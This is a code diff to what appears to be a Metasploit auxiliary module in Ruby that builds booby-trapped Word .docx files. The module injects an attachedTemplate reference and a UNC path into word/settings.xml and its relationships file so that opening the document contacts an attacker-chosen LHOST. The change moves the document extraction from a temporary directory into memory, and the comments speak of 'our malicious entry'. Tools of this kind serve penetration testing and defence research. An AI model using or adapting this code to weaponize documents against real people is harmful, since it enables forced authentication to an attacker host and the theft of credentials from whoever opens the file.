@@ -81,33 +81,29 @@ class Metasploit3 < Msf::Auxiliary
 
 	#here we inject an UNC path into an existing file, and store the injected file in FILENAME
 	def manipulate_file
-		#where do we unpack our source files
-		tmp_dir = "#{Dir.tmpdir}/unc#{Time.now.to_i}#{rand(1000)}/"
 		ref = "<w:attachedTemplate r:id=\"rId1\"/>"
-
-		if not File.exists?(datastore['SOURCE'])
-			print_error("File #{datastore['SOURCE']} does not exist.")
-			return nil	
-		end
 		
 		if not File.stat(datastore['SOURCE']).readable?
 			print_error("Not enough rights to read the file. Aborting.")
 			return nil
 		end
 
-		#lets extract our docx
-		if unzip_docx(tmp_dir).nil?
+		#lets extract our docx and store it in memory
+		zip_data = unzip_docx
+
+		#file to check for reference file we need
+		file_content = zip_data["word/settings.xml"]
+		if file_content.nil?
+			print_error("Bad \"word/settings.xml\" file, check if it is a valid .docx.")
 			return nil
 		end
 
-		file_content = File.read("#{tmp_dir}/word/settings.xml")
-
-		#if we can find the reference, we don't need to add it and can just inject our unc file.
+		#if we can find the reference to our inject file, we don't need to add it and can just inject our unc path.
 		if not file_content.index("w:attachedTemplate r:id=\"rId1\"").nil?
 			vprint_status("Reference to rels file already exists in settings file, we dont need to add it :)")
-			update_docx_file(tmp_dir,"word/_rels/settings.xml.rels", @rels_file_data)
+			zip_data["word/_rels/settings.xml.rels"] = @rels_file_data
 			# lets zip the end result
-			zip_docx(tmp_dir)
+			zip_docx(zip_data)
 		else
 			#now insert the reference to the file that will enable our malicious entry
 			insert_one = file_content.index("<w:defaultTabStop")
@@ -125,76 +121,46 @@ class Metasploit3 < Msf::Auxiliary
 
 			if insert_one.nil? && insert_two.nil?
 				print_error("Cannot find insert point for reference into settings.xml")
-				FileUtils.rm_rf(tmp_dir)
 				return nil
 			end
 
 			#update the files that contain the injection and reference
-			update_docx_file(tmp_dir, "word/settings.xml",file_content)
-			update_docx_file(tmp_dir, "word/_rels/settings.xml.rels", @rels_file_data)
-
+			zip_data["word/settings.xml"] = file_content
+			zip_data["word/_rels/settings.xml.rels"] = @rels_file_data
 			#lets zip the file
-			zip_docx(tmp_dir)
+			zip_docx(zip_data)
 		end
-	return 0
+		return 0
 	end
 
-	#making the actual docx
-	def zip_docx(tmp_dir)
+	#making the actual docx from the hash
+	def zip_docx(zip_data)
 		docx = Rex::Zip::Archive.new
-		#add skeleton files
-		vprint_status("Adding files from #{tmp_dir}")
-		Dir["#{tmp_dir}/**/**"].each do |file|
-			if not File.directory?(file)
-				docx.add_file(file.sub(tmp_dir,''), File.read(file))
-			end
+		zip_data.each_pair do |k,v|
+			docx.add_file(k,v)
 		end
-		#add the otherwise skipped "hidden" file
-		file = "#{tmp_dir}/_rels/.rels"
-		docx.add_file(file.sub(tmp_dir,''), File.read(file))
 		file_create(docx.pack)
-		FileUtils.rm_rf(tmp_dir)
 	end
 
 	#unzip the .docx document. sadly Rex::zip does not uncompress so we do it the Rubyzip way
-	def unzip_docx(tmp_dir)
-		#create temoprary directory so we can do some error handling if needed.
-		begin
-			if File.directory?(tmp_dir)
-				FileUtils.rm_rf(tmp_dir)
-			end
-			FileUtils.mkdir_p(tmp_dir) 
-		rescue
-			print_error("Error creating/deleting temporary directory #{tmp_dir}, check rights.")
-			return nil
-		end
-		#unzip the SOURCE document into the tmp_dir
-		vprint_status("Rubyzip sometimes corrupts the document, so we do it the hard way. Extracting #{datastore['SOURCE']}")
+	def unzip_docx
+		#Ruby sometimes corrupts the document when manipulating inside a compressed document, so we extract it with Zip::ZipFile
+		vprint_status("Extracting #{datastore['SOURCE']} into memory.")
+		#we read it all into memory
+		zip_data = Hash.new
 		begin
 			Zip::ZipFile.open(datastore['SOURCE'])  do |filezip|
 				filezip.each do |entry|
-					fpath = File.join(tmp_dir, entry.name)
-					FileUtils.mkdir_p(File.dirname(fpath))
-					filezip.extract(entry, fpath)
+					zip_data[entry.name] = filezip.read(entry)
 				end
 			end
 		rescue Zip::ZipError => e
 			print_error("Error extracting #{datastore['SOURCE']} please verify it is a valid .docx document.")
 			return nil
 		end
-		return 0
+		return zip_data
 	end
 
-	#used for updating the files inside the docx from a string
-	def update_docx_file(tmp_dir,file_string, content)
-		archive = File.join(tmp_dir, file_string)
-		vprint_status("We need to look for: #{archive}")
-		if File.exists?(archive)
-			vprint_status("Deleting original file #{archive}")
-			File.delete(archive)
-		end
-		File.open(archive, 'wb+') { |f| f.write(content) }
-	end
 
 	def run
 		#we need this in make_new_file and manipulate_file
@@ -206,7 +172,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		if "#{datastore['SOURCE']}" == ""
 			#make an empty file
-			print_status("Creating empty document")
+			print_status("Creating empty document that points to #{datastore['LHOST']}.")
 			make_new_file
 		else
 			#extract the word/settings.xml and edit in the reference we need
